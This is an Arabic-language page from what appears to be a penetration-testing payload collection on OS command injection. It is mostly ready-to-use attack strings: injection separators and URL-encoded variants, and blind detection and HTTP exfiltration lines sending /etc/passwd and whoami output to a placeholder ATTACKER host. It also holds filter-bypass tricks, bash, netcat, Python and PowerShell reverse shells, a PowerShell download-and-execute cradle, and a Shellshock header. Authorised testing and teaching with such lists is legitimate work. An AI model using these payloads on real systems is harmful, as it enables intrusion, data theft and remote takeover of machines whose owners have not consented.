<a id="-command-injection-payloads"></a>
# 💻 حمولات حقن الأوامر (Command Injection)

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Command-Injection.tr.md) • [🇬🇷 Ελληνικά](Command-Injection.el.md)

```
 ██████╗ ███████╗     ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ 
██╔═══██╗██╔════╝    ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗
██║   ██║███████╗    ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║
██║   ██║╚════██║    ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║
╚██████╔╝███████║    ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝
 ╚═════╝ ╚══════╝     ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ 
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗                   
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║                   
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║                   
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║                   
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║                   
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝                   
```

> الرسم النصي أعلاه يعرض عنوان المجموعة بالإنجليزية؛ تُشرح الموضوعات والمصطلحات بالعربية في الأقسام التالية.

---

<a id="-command-separators"></a>
## 🎯 فواصل الأوامر

<a id="linuxunix"></a>
### Linux/Unix
```bash
;       # فاصلة منقوطة - التنفيذ بعد الأمر السابق
|       # أنبوب - تمرير الخرج إلى الأمر التالي
||      # OR - التنفيذ إذا فشل الأمر الأول
&       # تشغيل في الخلفية
&&      # AND - التنفيذ إذا نجح الأمر الأول
`cmd`   # علامتا اقتباس خلفيتان - استبدال الأوامر
$(cmd)  # علامة الدولار - استبدال الأوامر
\n      # سطر جديد - فصل الأوامر
```

<a id="windows"></a>
### Windows
```cmd
;       # يعمل في بعض الحالات
|       # أنبوب
||      # OR
&       # تنفيذ الأمرين
&&      # AND
\n      # سطر جديد
%0a     # سطر جديد بترميز URL
```

---

<a id="-basic-payloads"></a>
## 💉 حمولات أساسية

<a id="simple-test"></a>
### اختبار بسيط
```bash
; id
; whoami
| id
| whoami
|| id
|| whoami
& id
& whoami
&& id
&& whoami
`id`
$(id)
```

<a id="url-encoded"></a>
### بترميز URL
```
%3B+id               # ; id
%7C+id               # | id
%7C%7C+id            # || id
%26+id               # & id
%26%26+id            # && id
%0A+id               # سطر جديد + id
```

---

<a id="-blind-command-injection"></a>
## 🔥 حقن الأوامر الأعمى

<a id="time-based-detection"></a>
### الكشف المعتمد على الزمن
```bash
# أوامر الانتظار
; sleep 5
| sleep 5
|| sleep 5
& sleep 5
&& sleep 5
`sleep 5`
$(sleep 5)

# Windows
; ping -n 5 127.0.0.1
| timeout 5
```

<a id="dns-based-detection"></a>
### الكشف عبر DNS
```bash
# استخدام nslookup
; nslookup BURP_COLLAB
| nslookup BURP_COLLAB
`nslookup BURP_COLLAB`
$(nslookup BURP_COLLAB)

# استخدام curl/wget
; curl http://BURP_COLLAB
; wget http://BURP_COLLAB
$(curl http://ATTACKER/?data=$(whoami))
```

<a id="http-based-exfiltration"></a>
### تسريب البيانات عبر HTTP
```bash
; curl http://ATTACKER/$(whoami)
; curl http://ATTACKER/?d=$(cat /etc/passwd | base64)
; wget http://ATTACKER/$(hostname)
$(curl http://ATTACKER/?id=$(id))
`curl http://ATTACKER/?user=$(whoami)`
```

---

<a id="-filter-bypass-techniques"></a>
## 🛡️ تقنيات تجاوز المرشحات

<a id="space-bypass"></a>
### تجاوز ترشيح المسافات
```bash
# استخدام $IFS (فاصل الحقول الداخلي)
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;{cat,/etc/passwd}

# استخدام محارف الجدولة
;cat	/etc/passwd

# استخدام الأقواس المعقوفة
{cat,/etc/passwd}
```

<a id="keyword-bypass"></a>
### تجاوز ترشيح الكلمات المفتاحية
```bash
# تجزئة الأوامر
w'h'oami
w"h"oami
who$@ami
who\ami

# استخدام محارف البدل
/bin/ca? /etc/passwd
/bin/c?t /etc/passwd
/b??/c?t /etc/passwd

# استخدام المتغيرات
$u; cat /etc/passwd
test=cat; $test /etc/passwd

# الترميز الست عشري
echo -e "\x69\x64" | sh    # id
```

<a id="special-character-bypass"></a>
### تجاوز ترشيح المحارف الخاصة
```bash
# استخدام فواصل مختلفة
;{cat,/etc/passwd}
;cat</etc/passwd
;cat$IFS/etc/passwd

# حقن سطر جديد
%0aid
%0Acat%20/etc/passwd

# استخدام التعليقات
; id #
| id #
```

---

<a id="-linux-payloads"></a>
## 🐧 حمولات Linux

<a id="file-reading"></a>
### قراءة الملفات
```bash
; cat /etc/passwd
; head /etc/passwd
; tail /etc/passwd
; less /etc/passwd
; more /etc/passwd
; nl /etc/passwd
; sort /etc/passwd
; uniq /etc/passwd
; strings /etc/passwd
; od -c /etc/passwd
; xxd /etc/passwd
; base64 /etc/passwd
```

<a id="command-execution"></a>
### تنفيذ الأوامر
```bash
; id
; whoami
; uname -a
; hostname
; pwd
; ls -la
; env
; ps aux
; netstat -an
; ifconfig
; ip addr
```

<a id="reverse-shell"></a>
### صدفة عكسية (Reverse Shell)
```bash
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
; nc -e /bin/sh ATTACKER 4444
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

---

<a id="-windows-payloads"></a>
## 🪟 حمولات Windows

<a id="basic-commands"></a>
### أوامر أساسية
```cmd
& whoami
& hostname
& ipconfig
& net user
& dir
& type C:\Windows\win.ini
& type C:\Windows\System32\drivers\etc\hosts
```

<a id="file-reading-1"></a>
### قراءة الملفات
```cmd
& type C:\Windows\win.ini
& type C:\inetpub\wwwroot\web.config
& more C:\Windows\win.ini
& find "password" C:\path\to\file.txt
```

<a id="powershell"></a>
### PowerShell
```powershell
& powershell -c "whoami"
& powershell -c "Get-Process"
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"
```

<a id="reverse-shell-1"></a>
### صدفة عكسية (Reverse Shell)
```cmd
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

<a id="-common-injection-points"></a>
## 📝 مواضع الحقن الشائعة

```
معاملات URL:
  ?ip=127.0.0.1;id
  ?file=test.txt|id
  ?cmd=ls

معاملات POST:
  filename=test.txt;id
  host=localhost|whoami

الترويسات:
  User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'
  X-Forwarded-For: ;id

أسماء الملفات المرفوعة:
  test;id;.txt
  test$(id).txt
  test`id`.txt
```

---

<a id="-testing-checklist"></a>
## 📋 قائمة التحقق للاختبار

```markdown
□ اختبار جميع فواصل الأوامر (; | || & && ` $())
□ اختبار الصيغ المرمّزة باستخدام URL
□ اختبار الحقن الأعمى المعتمد على الزمن
□ اختبار تسريب البيانات عبر DNS/HTTP
□ اختبار تجاوز المسافات ($IFS ومحارف الجدولة والأقواس المعقوفة)
□ اختبار تجاوز الكلمات المفتاحية (علامات الاقتباس ومحارف البدل)
□ اختبار حقن سطر جديد (%0a)
□ التحقق من المحارف التي تُرشّح
□ تجربة أوامر Linux وWindows
```

---

<a id="-related-payloads"></a>
## 🔗 حمولات ذات صلة

- [حمولات LFI](./LFI.ar.md)
- [حمولات SSTI](./SSTI.ar.md)

---

**العودة إلى الحمولات:** [💉 مجموعة الحمولات](../../README.md#-payloads-collection)
